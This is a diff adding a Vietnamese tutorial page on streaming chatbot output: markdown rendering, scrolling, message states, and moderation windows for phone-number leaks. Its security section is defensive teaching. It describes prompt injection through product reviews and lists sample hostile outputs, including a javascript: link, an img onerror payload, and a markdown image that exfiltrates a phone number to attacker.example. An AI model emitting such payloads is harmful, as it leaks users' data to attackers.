+      ['Moderation / guardrail', 'Bước kiểm tra output trước hoặc trong khi hiển thị, ví dụ một classifier phát hiện số điện thoại (PII) hay nội dung vi phạm.'],
+      ['Classifier', 'Một hàm hoặc model nhỏ đọc một đoạn văn rồi trả nhãn. Ví dụ đọc "gọi số 0123 456 789" trả "có số điện thoại". Lab dùng một biểu thức regex đóng vai classifier.'],
+      ['PII', 'Thông tin định danh cá nhân: số điện thoại, địa chỉ, số CMND. Ví dụ trợ lý lỡ đọc số điện thoại của người nhận trước đó.'],
+      ['Cửa sổ kiểm duyệt', 'Số token backend giữ lại để kiểm tra trước khi gửi xuống. Cửa sổ 10 token nghĩa là khách nhận chữ theo từng cụm 10 token đã được duyệt.'],
+      ['Rút lại (retract)', 'Đã hiển thị rồi mới phát hiện vi phạm, nên ẩn đoạn đó và thay bằng thông báo. Khách có thể đã đọc hoặc chụp màn hình.'],
+      ['finish_reason / finishReason', 'Lý do stream dừng. "stop" là xong bình thường; "content_filter" (Azure) hay "SAFETY" (Gemini) là bị bộ lọc chặn.']
+    ],
+    problem: {
+      example: '<b>ShopViet</b> stream câu trả lời của trợ lý chat qua SSE. Model hay trả markdown: bảng so sánh tai nghe, chữ đậm, khối chứa mã đổi trả, link chính sách. Trợ lý còn đọc dữ liệu đơn hàng, nên có rủi ro lỡ đọc ra thông tin của khách khác.',
+      scenario: 'Khách hỏi so sánh hai mẫu tai nghe. Trong lúc stream, bảng hiện ra như một dòng chữ đầy dấu | rồi đột nhiên bật thành bảng; "**Lưu ý" in nguyên dấu sao. Ở một đơn khác, trợ lý viết ra số điện thoại của người nhận trước đó.',
+      ask: 'Render thế nào để không nhảy và không lộ ký hiệu thô? Kiểm duyệt output đang stream thì đặt cửa sổ bao nhiêu: nhỏ thì nhanh nhưng dễ lọt, lớn thì an toàn nhưng chậm?',
+      solves: 'README §3.8: tạm đóng cú pháp chưa kết thúc (như Streamdown), hoặc chỉ render khối đã đóng; gom delta và render mỗi frame. §3.9: buffer theo câu hoặc đoạn rồi chạy classifier, hoặc stream ngay và rút lại; nội dung bắt buộc duyệt trước thì không stream.',
+      read: ['Phần 1: cột trái là markdown thô đã nhận đến chunk hiện tại, cột phải là thứ khách thấy. Viền cam đứt là khối đang lộ ký hiệu thô, viền đỏ là khối vừa đổi kiểu (nhảy layout).', 'Bảng nhỏ đếm trên toàn bộ ' + PREF.length + ' bước: số lần nhảy, số bước lộ ký hiệu thô, số ký tự trung bình bị giữ lại chưa hiện.', 'Phần 2: làn trên là lúc model sinh từng token, làn dưới là lúc khách thấy. Token đỏ là số điện thoại. Vạch đứt là ranh giới cửa sổ kiểm duyệt.', 'Lab coi mỗi từ là một token cho dễ nhìn, nên số "0123 456 789" là 3 token. TTFT (thời gian chờ tới chữ đầu tiên) 0,8 giây và 20 ms mỗi token theo ví dụ README; thời gian chạy classifier là giả định, chỉnh được.']
+    },
+    summary: `<h3>Tóm tắt bài</h3>
+<h4>Phía UI (README §3.8)</h4>
+<ul><li><b>Markdown chưa đóng:</b> renderer thường hiển thị phần sau thành code, hoặc làm layout nhảy liên tục. Streamdown (thay cho react-markdown) tự tạm đóng cú pháp chưa kết thúc. Tự viết thì ít nhất tạm đóng code fence khi số dấu backtick ba là số lẻ.</li>
+<li><b>Hiệu năng:</b> parse lại toàn bộ markdown mỗi delta tốn CPU theo bình phương độ dài. Gom delta, render mỗi frame (requestAnimationFrame) hoặc mỗi 30–50 ms.</li>
+<li><b>Cuộn:</b> chỉ tự cuộn khi người dùng đang ở cuối.</li>
+<li><b>An toàn:</b> output là dữ liệu không tin cậy. Không render HTML thô; chỉ tạo link với https; cẩn thận ảnh markdown trỏ domain ngoài.</li></ul>
+<div class="tbl"><table><tr><th>Trạng thái</th><th>Dấu hiệu</th><th>Hiển thị</th></tr>
+<tr><td>Đang chờ</td><td>Đã gửi, chưa có event</td><td>Spinner</td></tr><tr><td>Đang suy nghĩ / chạy tool</td><td>Event status</td><td>Nhãn cụ thể ("Đang tra cứu đơn hàng")</td></tr>
+<tr><td>Đang viết</td><td>Có delta văn bản</td><td>Văn bản và con trỏ nhấp nháy</td></tr><tr><td>Xong</td><td>Event done</td><td>Bật nút sao chép, tạo lại</td></tr>
+<tr><td>Bị gián đoạn</td><td>Lỗi, hoặc đóng kết nối mà không có done</td><td>Giữ phần đã nhận, báo rõ, nút thử lại</td></tr></table></div>
+<h4>Moderation trên output đang stream (README §3.9)</h4>
+<p>Stream muốn hiện ngay, kiểm duyệt muốn xem đủ rồi mới quyết định. Phần đã hiển thị không thu hồi được. Các lựa chọn, từ rủi ro thấp đến cao:</p>
+<ol><li><b>Không stream</b> với nội dung bắt buộc duyệt trước.</li><li><b>Buffer theo câu hoặc đoạn</b> ở backend, chạy classifier rồi mới gửi. TTFT tăng bằng thời gian sinh một đoạn cộng thời gian classifier.</li><li><b>Stream ngay, kiểm duyệt song song</b>, có cơ chế rút lại. Hợp chatbot nội bộ.</li></ol>
+<div class="verdict"><b>Provider:</b> OpenAI ghi moderation score chỉ đến sau khi sinh xong. Azure mặc định buffer theo khối; chế độ Asynchronous Filter trả token ngay và có thể đã hiển thị phần lẽ ra bị lọc; khi chặn vẫn là status 200 với finish_reason "content_filter". Gemini dừng với finishReason như SAFETY, BLOCKLIST, PROHIBITED_CONTENT, SPII.</div>`,
+    why: {
+      c: 'UI: tạm đóng cú pháp dở dang và giữ lại dòng bảng chưa có dòng phân cách, render theo frame chứ không theo delta, tự cuộn chỉ khi người dùng ở cuối, hiển thị đủ năm trạng thái. Kiểm duyệt cho trợ lý khách hàng của ShopViet: buffer theo câu ở backend, vì một câu là đơn vị nghĩa đủ để classifier quyết định, và số điện thoại không bị cắt ngang hai cửa sổ.',
+      s: 'Render lại toàn bộ mỗi delta bằng renderer thường: nhảy layout, lộ ký hiệu, tốn CPU bình phương. Chỉ render khối đã đóng: sạch nhưng chữ hiện theo từng đoạn, mất cảm giác stream. Cửa sổ kiểm duyệt cố định nhỏ: nhanh nhưng PII bị cắt ngang và lọt. Stream ngay rồi rút lại cho khách hàng bên ngoài: khách đã kịp thấy.',
+      p: 'Tạm đóng là đoán: đôi khi đoán sai rồi sửa lại. Buffer theo câu làm TTFT tăng bằng thời gian sinh một câu cộng classifier, và chữ đến theo nhịp câu chứ không đều. Rút lại vẫn để lộ trong vài trăm mili giây. Không có cấu hình nào vừa hiện ngay vừa chặn chắc chắn.'
+    },
+    deep: [
+      {
+        q: 'Vì sao markdown đang stream lại hiện ra lung tung? Renderer bị lỗi à?',
+        a: `<p>Không lỗi. Renderer không biết câu trả lời <b>chưa xong</b>. Nó nhận chuỗi "**Lưu ý" và làm đúng luật markdown: hai dấu sao không có cặp thì in nguyên. Nó nhận "| Mẫu | Pin |" mà chưa có dòng "|---|" bên dưới, nên coi đó là đoạn chữ thường. Một tích tắc sau dòng phân cách đến, cả khối bật thành bảng, mọi thứ bên dưới bị đẩy xuống.</p>
+<p>Bảng dưới lấy năm tiền tố thật từ câu trả lời mẫu, render bằng renderer nhỏ trong trang (thường) và bằng cách tạm đóng.</p>`,
+        viz(box) {
+          const picks = ['**Lưu ý:** cả hai', '| Mẫu | Pin | Chống nước |\n|---|-', 'Xem thêm [chính sách đổi trả](https://shopv', 'Mã đổi trả của anh:\n\n``', 'Mã đổi trả của anh:\n\n' + F + 'text\nDT-20', 'nhắn mã đơn `DH-20'];
+          const render = (s) => md(s).map((b) => `<div style="${b.raw ? 'outline:2px dashed var(--warn);outline-offset:1px' : ''}">${b.h}</div>`).join('') || '<i class="mute">(trống)</i>';
+          box.append(el('style', { text: CSS }), el('div', { class: 'tbl' }, [el('table', { html: '<tr><th>Đã nhận (thô)</th><th>Renderer thường</th><th>Tạm đóng</th></tr>' + picks.map((p) => `<tr><td><pre class="mdsrc" style="min-height:0">${esc(p)}</pre></td><td class="mdv">${render(p)}</td><td class="mdv">${render(patch(p).text)}</td></tr>`).join('') })]),
+            el('div', { class: 'cap', text: 'Viền cam đứt là khối lộ ký hiệu thô. Cột "Tạm đóng" giữ lại dòng bảng chưa có dòng phân cách, cắt phần link chưa xong, thêm dấu đóng cho ** và backtick, và đóng tạm code fence khi số fence là số lẻ.' }));
+        },
+        take: 'Renderer làm đúng luật; vấn đề là nó luôn nghĩ văn bản đã xong. Phải cho nó biết cái gì còn đang mở.'
+      },
+      {
+        q: 'Tạm đóng cú pháp nghe như đoán. Đoán sai thì sao? Sao không chỉ render khối đã xong cho chắc?',
+        a: `<p>Đúng là đoán. Thư viện Streamdown được viết để thay react-markdown, tự phát hiện và tạm đóng cú pháp chưa kết thúc. Có lúc đoán sai: một dấu * ở đầu dòng có thể là gạch đầu dòng, không phải nửa đầu của **. Khi dấu thật đến, khối được render lại đúng, chỉ sai trong vài chục mili giây.</p>
+<p>Render chỉ khối đã đóng thì không bao giờ sai, nhưng mất ý nghĩa của stream: chữ đến theo từng đoạn. Trong hình chính, chọn "Chỉ khối đã đóng" và nhìn số "ký tự bị giữ lại trung bình": khách đọc chậm hơn model đúng bằng một đoạn.</p>
+<p>Cách hay gặp trong thực tế là kết hợp: tạm đóng các cú pháp nhỏ trong dòng (**, backtick, link), còn bảng thì giữ lại tới khi có dòng phân cách, vì bảng là thứ gây nhảy layout mạnh nhất.</p>`,
+        take: 'Tạm đóng đổi một chút sai tạm thời lấy tốc độ hiển thị. Chỉ render khối đã đóng đổi tốc độ lấy sự chắc chắn.'
+      },
+      {
+        q: 'Vì sao parse lại toàn bộ mỗi delta lại tốn "bình phương"?',
+        a: `<p>Mỗi delta chỉ thêm vài ký tự, nhưng renderer parse lại <b>từ đầu</b>. Delta thứ 1 parse 4 ký tự, delta thứ 2 parse 8, delta thứ 1000 parse 4.000. Tổng là 4 + 8 + ... + 4.000, cỡ một nửa của (số delta × độ dài cuối). Độ dài tăng gấp đôi thì tổng công việc tăng gấp bốn.</p>
+<p>README khuyên gom delta lại và chỉ render một lần mỗi frame, hoặc mỗi 30–50 ms. Mắt người không phân biệt được 60 lần cập nhật mỗi giây với 20 lần. Số lần render giờ phụ thuộc vào <b>thời gian</b>, không phụ thuộc số delta.</p>`,
+        viz(box) {
+          const S = { L: 6000, d: 4, every: 50 }, out = el('div');
+          function draw() {
+            const n = Math.ceil(S.L / S.d), perDelta = (S.d * n * (n + 1)) / 2, genT = (S.L / S.d) * ITL, frames = Math.max(1, Math.ceil((genT * 1000) / S.every)), perFrame = (S.L * (frames + 1)) / 2;
+            out.replaceChildren(hbars([['Render mỗi delta', perDelta, false], [`Render mỗi ${S.every} ms`, perFrame, true]], { max: perDelta, fmt: (v) => (v / 1e6).toFixed(2) + 'M' }),
+              el('div', { class: 'stat', html: `<span>${n} delta → <b>${n}</b> lần parse</span><span>${frames} frame → <b>${frames}</b> lần parse</span><span>Ít hơn <b>${(perDelta / perFrame).toFixed(1)}×</b> ký tự phải parse</span>` }));
+          }
+          box.append(el('div', { class: 'row' }, [slider('Độ dài câu trả lời', 1000, 20000, 1000, S.L, (v) => { S.L = v; draw(); }, (v) => v + ' ký tự').node, slider('Gom mỗi', 16, 100, 2, S.every, (v) => { S.every = v; draw(); }, (v) => v + ' ms').node]), out,
+            el('div', { class: 'cap', text: 'Giả định mỗi delta 4 ký tự và 20 ms một delta (ITL trong ví dụ README). Số trên thanh là tổng số ký tự phải parse cho cả câu trả lời, tính ngay trong trình duyệt.' }));
+          draw();
+        },
+        take: 'Render theo nhịp thời gian, không theo nhịp delta. Câu trả lời càng dài, chênh lệch càng lớn.'
+      },
+      {
+        q: 'Còn chuyện cuộn trang: cứ tự cuộn xuống cuối cho khách đỡ phải kéo, sai chỗ nào?',
+        a: `<p>Sai khi khách đã <b>cuộn lên</b> để đọc lại bảng so sánh. Mỗi delta mới lại kéo họ xuống cuối, họ không đọc được gì. README: chỉ tự cuộn khi người dùng đang ở cuối. Cách làm thường gặp: trước khi thêm chữ, đo khoảng cách từ vị trí đang xem tới đáy; nếu nhỏ hơn một ngưỡng (vài chục pixel, tuỳ bạn chọn) thì cuộn theo, không thì để yên và hiện nút "Xuống cuối".</p>
+<p>Cùng lý do, đừng render lại cả danh sách tin nhắn ở mỗi delta: chỉ cập nhật bong bóng đang stream, để vị trí cuộn và vùng chữ đang được bôi đen không bị mất.</p>`,
+        take: 'Tự cuộn là hành vi mặc định khi khách đang theo dõi; khách cuộn lên thì quyền điều khiển là của khách.'
+      },
+      {
+        q: 'Một bong bóng chat có bao nhiêu trạng thái? Sao không chỉ "đang tải" và "xong"?',
+        a: `<p>README liệt kê ít nhất năm: đang chờ, đang suy nghĩ hoặc chạy tool, đang viết, xong, bị gián đoạn. Trạng thái <b>bị gián đoạn</b> là cái hay bị quên nhất, và nó nối thẳng với Lab 6: thiếu event <code>done</code> thì không được hiện như "xong".</p>
+<p>Chọn một chuỗi event (theo schema chuẩn hoá của README §3.1: <code>status</code>, <code>text</code>, <code>error</code>, <code>done</code>) và xem UI đi qua những trạng thái nào. Cột cuối là kết quả của một UI chỉ biết hai trạng thái.</p>`,
+        viz(box) {
+          const SEQ = { ok: ['status:thinking', 'text', 'text', 'done'], tool: ['status:tool', 'status:tool', 'text', 'text', 'done'], err: ['text', 'text', 'error'], drop: ['text', 'text', 'close'] };
+          const LBL = { 'status:thinking': ['Đang suy nghĩ', 'Nhãn "Đang suy nghĩ"'], 'status:tool': ['Đang chạy tool', 'Nhãn "Đang tra cứu đơn hàng"'], text: ['Đang viết', 'Chữ + con trỏ nhấp nháy'], done: ['Xong', 'Bật Sao chép, Tạo lại'], error: ['Bị gián đoạn', 'Giữ phần đã nhận, báo lỗi, nút Thử lại'], close: ['Bị gián đoạn', 'Không có done: báo gián đoạn, nút Thử lại'] };
+          const out = el('div');
+          const draw = (k) => {
+            const rows = [['(gửi)', 'Đang chờ', 'Spinner', 'đang tải']].concat(SEQ[k].map((e) => [e === 'close' ? '(kết nối đóng)' : 'event: ' + e.split(':')[0], ...LBL[e], e === 'text' || e.startsWith('status') ? 'đang tải' : 'xong']));
+            const lastBad = SEQ[k].slice(-1)[0] !== 'done';
+            out.innerHTML = '<div class="tbl"><table><tr><th>Nhận</th><th>Trạng thái</th><th>UI đúng</th><th>UI hai trạng thái</th></tr>' + rows.map((r, i) => `<tr><td class="mono">${r[0]}</td><td><b>${r[1]}</b></td><td>${r[2]}</td><td${i === rows.length - 1 && lastBad ? ' class="bad"' : ''}>${r[3]}</td></tr>`).join('') + '</table></div>' +
+              (lastBad ? '<div class="cap"><b class="bad">UI hai trạng thái hiện "xong" cho một câu trả lời cụt.</b> Khách sao chép một câu dừng giữa chừng mà không biết. Trong hệ thống thật: "xong" chỉ đến từ event done.</div>' : '<div class="cap">Chuỗi bình thường: cả hai UI kết thúc giống nhau, nhưng UI đúng cho khách biết đang làm gì trong lúc chờ.</div>');
+          };
+          box.append(el('div', { class: 'row' }, [select('Chuỗi event', [['ok', 'Suy nghĩ rồi trả lời'], ['tool', 'Tra cứu đơn rồi trả lời'], ['err', 'Lỗi giữa chừng'], ['drop', 'Đứt kết nối']], 'err', draw).node]), out);
+          draw('err');
+        },
+        take: 'Trạng thái "bị gián đoạn" là thứ phân biệt một UI trung thực với một UI giấu lỗi.'
+      },
+      {
+        q: 'Output của model chỉ là chữ, render ra thì nguy hiểm gì?',
+        a: `<p>README: output của model là <b>dữ liệu không tin cậy</b>. Model có thể bị prompt injection (ví dụ từ một đánh giá sản phẩm chứa lệnh ẩn) và in ra thứ kẻ tấn công muốn. Ba quy tắc:</p>
+<ul><li>Không render HTML thô từ model.</li><li>Chỉ biến URL thành link khi scheme là https.</li><li>Cẩn thận ảnh markdown trỏ domain ngoài: trình duyệt tự tải ảnh, và URL ảnh có thể mang dữ liệu ra ngoài, ví dụ <code>![x](https://attacker.example/?q=số-điện-thoại)</code>.</li></ul>
+<p>Bảng dưới chạy một bộ lọc nhỏ theo ba quy tắc đó trên vài output mẫu.</p>`,
+        viz(box) {
+          const ALLOW = ['shopviet.vn'];
+          const samples = ['[chính sách](https://shopviet.vn/doi-tra)', '[bấm vào đây](javascript:alert(1))', '[tải app](http://shopviet.vn/app)', '<img src=x onerror="fetch(1)">', '![ảnh](https://shopviet.vn/a.png)', '![x](https://attacker.example/?q=0123456789)'];
+          function judge(s) {
+            if (/<[a-z]/i.test(s)) return ['bad', 'HTML thô: escape, hiện như chữ'];
+            const m = s.match(/^(!?)\[[^\]]*\]\(([^)]*)\)$/);
+            if (!m) return ['ok', 'Chữ thường'];
+            let u; try { u = new URL(m[2]); } catch (e) { return ['bad', 'URL không hợp lệ: hiện như chữ']; }
+            if (u.protocol !== 'https:') return ['bad', `Scheme ${u.protocol} không phải https: không tạo link`];
+            if (m[1] && !ALLOW.includes(u.hostname)) return ['bad', `Ảnh từ domain ngoài (${u.hostname}): không tải`];
+            return ['ok', m[1] ? 'Ảnh từ domain cho phép' : 'Link https: cho phép'];
+          }
+          box.append(el('div', { class: 'tbl' }, [el('table', { html: '<tr><th>Model in ra</th><th>Quyết định</th></tr>' + samples.map((s) => { const [c, t] = judge(s); return `<tr><td class="mono" style="overflow-wrap:anywhere">${esc(s)}</td><td class="${c}">${t}</td></tr>`; }).join('') })]),
+            el('div', { class: 'cap', text: 'Danh sách domain cho phép ảnh (chỉ shopviet.vn) là giả định của lab. Quyết định được tính bằng URL parser của trình duyệt.' }));
+        },
+        take: 'Coi markdown của model như input của người lạ: escape HTML, lọc scheme, chặn ảnh ngoài.'
+      },
+      {
+        q: 'Chuyển sang kiểm duyệt: sao không stream ngay rồi kiểm sau, thấy sai thì xoá?',
+        a: `<p>Vì <b>phần đã hiển thị không thu hồi được</b>. Khách đã đọc, có thể đã chụp màn hình, và một số điện thoại chỉ cần nhìn một lần. Stream muốn hiện từng token ngay; kiểm duyệt muốn xem đủ nội dung rồi mới quyết định. Hai thứ kéo ngược nhau.</p>
+<p>Còn một cái bẫy nữa ở hình chính: nếu classifier chỉ nhìn từng cửa sổ riêng lẻ, mà một số điện thoại bị cắt ngang hai cửa sổ ("0123 456" ở cửa sổ này, "789" ở cửa sổ sau), thì <b>không cửa sổ nào khớp mẫu</b>, và số lọt ra dù bạn đã buffer. Hình chính mở sẵn với cửa sổ 9 token để thấy đúng hiện tượng này; thử 6 hoặc 12 cũng lọt, còn 8 hoặc 10 thì bắt được.</p>
+<p>Vì sao to hơn chưa chắc an toàn hơn: số điện thoại là token thứ 36, 37, 38. Cửa sổ rộng W cắt ở token W, 2W, 3W… Nếu có một vạch cắt rơi vào giữa ba token này (9 cắt sau token 36, 12 cắt sau 36, 18 và 36 cũng vậy) thì số bị chia đôi và lọt. Điều này không có nghĩa nên chọn số 8 hay 10: với câu khác, số nằm ở chỗ khác. Trong hệ thống thật: cắt cửa sổ theo câu, hoặc cho cửa sổ sau chồng lên vài token cuối của cửa sổ trước.</p>
+<p>README ghi một hiện tượng cùng họ ở Azure: trong thử nghiệm với blocklist, một từ bị chặn nằm ở 15–30 từ cuối của stream có thể được trả về với finish_reason "stop", trong khi cùng câu trả lời ở chế độ không stream bị chặn.</p>`,
+        take: 'Rút lại chỉ giảm thời gian bị lộ, không xoá được việc đã lộ. Và cửa sổ cắt ngang đúng chỗ thì buffer cũng không cứu.'
+      },
+      {
+        q: 'Provider có tự kiểm duyệt khi stream không? Client phải làm gì?',
+        a: `<div class="tbl"><table><tr><th>Provider</th><th>README ghi</th><th>Client cần</th></tr>
+<tr><td>OpenAI</td><td>Stream làm kiểm duyệt khó hơn; moderation score (nếu yêu cầu) chỉ đến sau khi sinh xong, không nằm trong delta; có thể ảnh hưởng việc được phê duyệt sử dụng</td><td>Tự kiểm duyệt nếu cần chặn trước khi hiện</td></tr>
+<tr><td>Azure OpenAI (mặc định)</td><td>Content filter chạy theo từng đoạn output, nội dung được buffer và trả theo khối</td><td>Chấp nhận chữ đến theo khối</td></tr>
+<tr><td>Azure Asynchronous Filter</td><td>Trả token ngay; tín hiệu lọc đến trễ; phần lẽ ra bị lọc có thể đã hiển thị</td><td>Có cơ chế rút lại</td></tr>
+<tr><td>Azure khi chặn</td><td>Status 200, finish_reason "content_filter"; token trước điểm lọc vẫn bị tính</td><td>Xử lý finish_reason này như một kết thúc đặc biệt</td></tr>
+<tr><td>Gemini</td><td>Dừng stream với finishReason như SAFETY, BLOCKLIST, PROHIBITED_CONTENT, SPII</td><td>Không chỉ chờ STOP; mọi giá trị khác phải hiện trạng thái rõ</td></tr></table></div>
+<p>Điểm chung: lỗi kiểm duyệt cũng đến <b>sau status 200</b>, giống lỗi giữa stream ở Lab 6. Client chỉ nhìn status sẽ hiện câu trả lời bị chặn giữa chừng như câu trả lời bình thường.</p>`,
+        take: 'Bộ lọc của provider là một lớp, không phải toàn bộ. Client vẫn phải đọc finish_reason và có trạng thái cho "bị chặn".'
+      },
+      {
+        q: 'Vậy ShopViet nên chọn cách nào?',
+        a: `<p>README xếp ba thiết kế từ rủi ro thấp đến cao: không stream; buffer theo câu hoặc đoạn; stream ngay và rút lại. Chọn theo <b>ai đọc</b> và <b>giá của một lần lọt</b>:</p>
+<ul><li><b>Trợ lý khách hàng</b> có đọc dữ liệu đơn hàng: buffer theo câu. Một lần lọt số điện thoại là sự cố dữ liệu cá nhân. Thêm vài trăm mili giây TTFT là giá chấp nhận được, chữ vẫn chảy theo từng câu.</li>
+<li><b>Tin nhắn gửi đi thay mặt ShopViet</b> (email, SMS tự động): không stream, duyệt toàn bộ rồi mới gửi.</li>
+<li><b>Chatbot nội bộ</b> cho nhân viên kho: stream ngay, kiểm duyệt song song và rút lại, ghi log để xem lại.</li></ul>
+<p>Classifier, phát hiện PII và cách xử lý refusal nằm ở chủ đề Guardrails.</p>`,
+        take: 'Không có cửa sổ "đúng" chung. Cửa sổ là chỗ bạn đặt giá giữa vài trăm mili giây và một lần lộ dữ liệu.'
+      }
+    ],
+    poc: {
+      goal: "Phần A render câu trả lời markdown của ShopViet bằng <code>markdown-it-py</code> thật sau mỗi delta 6 ký tự, có và không tạm đóng cú pháp. Phần B đo CPU khi render lại mỗi delta so với gom theo frame. Phần C chạy bốn cách kiểm duyệt trên một câu lỡ đọc ra số điện thoại khách khác.",
+      file: "docs/streaming/pocs/07_ui_moderation.py",
+      run: "uv run docs/streaming/pocs/07_ui_moderation.py",
+      needs: "Không cần key hay server: Python + <code>markdown-it-py</code>, khoảng 7 giây. <b>Đo thật:</b> Phần A dùng <code>markdown-it-py</code> thật (đếm ký hiệu thô và block đổi loại trên HTML nó trả ra); Phần B đo CPU thật trên máy chạy, nên số ms đổi theo máy, còn số ký tự parse thì không. <b>Kịch bản:</b> nội dung từng delta, thời gian sinh (TTFT 300 ms, 40 ms/delta), classifier là regex cộng 50 ms chờ giả; \"render mỗi 50 ms\" ở Phần B thực ra là render mỗi 3 delta. Số ms ở Phần C được đo bằng đồng hồ, nhưng gần như chỉ là tổng các khoảng chờ trong kịch bản; thứ thật sự được kiểm là số điện thoại có lọt hay không.",
+      output: "=== A. markdown-it render sau mỗi delta 6 ký tự: lộ ký hiệu thô và block nhảy loại\ncách render                    | lần render | có ký hiệu thô | block đổi loại (đoạn → bảng)\nrender thẳng văn bản dở        |         63 |             12 |              1\ntạm đóng cú pháp (patch)       |         63 |              0 |              0\n\n=== B. Chi phí render: câu trả lời dài gấp 12 lần (~4524 ký tự), mỗi delta 4 ký tự\nrender lại mỗi delta               |    1422 ms CPU | tổng ký tự đã parse  2.587.812\ngom, render mỗi 50 ms (~3 delta)   |     475 ms CPU | tổng ký tự đã parse    865.636\n\n=== C. Kiểm duyệt output đang stream (classifier regex số điện thoại, giả định 50 ms mỗi lần gọi)\ncách                                 | chữ đầu | số điện thoại từng lộ  | khách thấy cuối cùng\nstream, kiểm từng delta              |  397 ms | 0912 345 678           | …912 345 678. Anh cần đổi địa chỉ thì báo em nhé.\nstream, kiểm cộng dồn rồi rút lại    |  396 ms | 0912 345 678 (240 ms)  | … số [đã ẩn]. Anh cần đổi địa chỉ thì báo em nhé.\nbuffer theo câu rồi kiểm             |  438 ms | -                      | …. [đã ẩn câu]Anh cần đổi địa chỉ thì báo em nhé.\nkhông stream, kiểm cả bài            |  774 ms | -                      | … số [đã ẩn]. Anh cần đổi địa chỉ thì báo em nhé.\n\nRút ra: render thẳng markdown dở dang lộ **, |, ]( ở nhiều lần render; tạm đóng cú pháp (như Streamdown) không còn lần nào. Gom delta theo frame giảm CPU khoảng 3 lần. Kiểm từng delta để lọt số điện thoại bị cắt qua 3 delta; rút lại thì số vẫn hiện trên màn hình vài trăm ms; buffer theo câu chặn được, đổi lại chữ đầu đến muộn hơn.",
+      measured: true,
+      read: ["Phần A: render thẳng có 12/63 lần lộ <code>|</code>, <code>**</code>, <code>](</code>, <code>`</code> và 1 lần đoạn văn bật thành bảng; tạm đóng cú pháp còn 0 và 0.", "Phần B: render lại mỗi delta parse ~2,6 triệu ký tự (~1,4 s CPU) cho câu trả lời 4.500 ký tự; gom mỗi 3 delta giảm còn khoảng một phần ba.", "Phần C: kiểm từng delta để lọt nguyên số vì nó bị cắt qua 3 delta; kiểm cộng dồn rồi rút lại thì số vẫn hiện ~240 ms; buffer theo câu chặn được, chữ đầu chậm hơn kiểm từng delta ~40 ms (câu đầu ở đây chỉ dài 2 delta; câu dài hơn thì chậm hơn); không stream thì chữ đầu ~770 ms."]
+    },
+    mount(stage) {
+      stage.append(el('style', { text: CSS }));
+      const S = { step: Math.floor(PREF.length * 0.3), mode: 'naive' };
+      let runs = { naive: runAll('naive'), patch: runAll('patch'), closed: runAll('closed') }, timer = null;
+      const src = el('pre', { class: 'mdsrc' }), view = el('div', { class: 'mdv', style: 'border:1px solid var(--line);border-radius:6px;padding:8px 10px;min-height:120px;background:var(--panel)' });
+      const cmp = el('div'), cap = el('div', { style: CAPS });
+      const stS = slider('Chunk', 1, PREF.length, 1, S.step + 1, (v) => { S.step = v - 1; render(); }, (v) => `${v}/${PREF.length}`);
+      const play = el('button', { text: 'Chạy', onclick: () => {
+        if (timer) { clearInterval(timer); timer = null; play.textContent = 'Chạy'; return; }
+        if (S.step >= PREF.length - 1) S.step = 0;
+        play.textContent = 'Dừng';
+        timer = setInterval(() => { S.step++; stS.input.value = S.step + 1; if (S.step >= PREF.length - 1) { clearInterval(timer); timer = null; play.textContent = 'Chạy'; } render(); }, 70);
+      } });
+      function render() {
+        S.step = Math.max(0, Math.min(PREF.length - 1, S.step));
+        const R = runs[S.mode], st = R.steps[S.step], raw = PREF[S.step], cur = CH[S.step];
+        src.innerHTML = esc(raw.slice(0, raw.length - cur.length)) + `<mark style="background:var(--accent-soft);color:var(--ink)">${esc(cur)}</mark>`;
+        view.innerHTML = st.b.map((b, i) => `<div class="${st.flipAt[i] ? 'mdflip' : b.raw ? 'mdraw' : ''}">${b.h}</div>`).join('') + (st.hidden ? `<div class="hint" style="margin:0"><span class="cursor"></span> ${st.hidden} ký tự đã nhận nhưng đang giữ lại</div>` : '<span class="cursor"></span>');
+        cmp.innerHTML = '<div class="tbl" style="overflow-x:auto"><table style="border-collapse:collapse;font-size:13px;width:100%">' + '<tr><th style="text-align:left;padding:4px 8px;border:1px solid var(--line)">Cách render</th><th style="text-align:left;padding:4px 8px;border:1px solid var(--line)">Lần nhảy layout</th><th style="text-align:left;padding:4px 8px;border:1px solid var(--line)">Bước lộ ký hiệu thô</th><th style="text-align:left;padding:4px 8px;border:1px solid var(--line)">Ký tự bị giữ lại (TB)</th></tr>' +
+          [['naive', 'Render lại toàn bộ (thường)'], ['patch', 'Tạm đóng cú pháp'], ['closed', 'Chỉ khối đã đóng']].map(([k, n]) => { const r = runs[k], td = 'style="padding:4px 8px;border:1px solid var(--line)' + (k === S.mode ? ';background:var(--accent-soft)' : '') + '"'; return `<tr><td ${td}><b>${n}</b></td><td ${td}><span class="${r.flips ? 'bad' : 'ok'}">${r.flips}</span></td><td ${td}><span class="${r.rawSteps ? 'bad' : 'ok'}">${r.rawSteps}/${PREF.length}</span></td><td ${td}>${fx(r.avgHidden)}</td></tr>`; }).join('') + '</table></div>';
+        const flipNow = st.flipAt.some(Boolean), rawNow = st.b.some((b) => b.raw);
+        let col = 'var(--ok)', html;
+        if (flipNow) { col = 'var(--bad)'; html = '<b style="color:var(--bad)">Nhảy layout ở chunk này.</b> Một khối đang hiện vừa đổi kiểu (thường là đoạn chữ có dấu | bật thành bảng, hoặc dòng có backtick thành code block). Vì sao: dòng quyết định kiểu khối (dòng phân cách |---|, dấu đóng fence) đến sau dòng mở. Không có nghĩa nội dung sai: chỉ là renderer quyết định quá sớm. Trong hệ thống thật: giữ lại dòng bảng tới khi có dòng phân cách, đóng tạm fence.'; }
+        else if (rawNow) { col = 'var(--warn)'; html = '<b style="color:var(--warn)">Khách đang thấy ký hiệu thô</b> (dấu **, |, [, backtick). Vì sao: dấu mở đã đến, dấu đóng chưa đến, renderer in nguyên. Trong hệ thống thật: tạm đóng cú pháp như Streamdown, hoặc tự đếm dấu.'; }
+        else html = S.mode === 'closed' && st.hidden ? `<b style="color:var(--ok)">Sạch, nhưng chậm:</b> ${st.hidden} ký tự đã đến mà khách chưa thấy, vì khối chứa chúng chưa đóng.` : '<b style="color:var(--ok)">Chunk này hiển thị sạch.</b> Kéo thanh hoặc bấm Chạy để tìm chỗ nhảy.';
+        cap.style.borderLeft = '3px solid ' + col; cap.innerHTML = html;
+      }
+      stage.append(el('div', { class: 'row' }, [play, stS.node, select('Cách render', [['naive', 'Render lại toàn bộ (thường)'], ['patch', 'Tạm đóng cú pháp'], ['closed', 'Chỉ khối đã đóng']], S.mode, (v) => { S.mode = v; render(); }).node]),
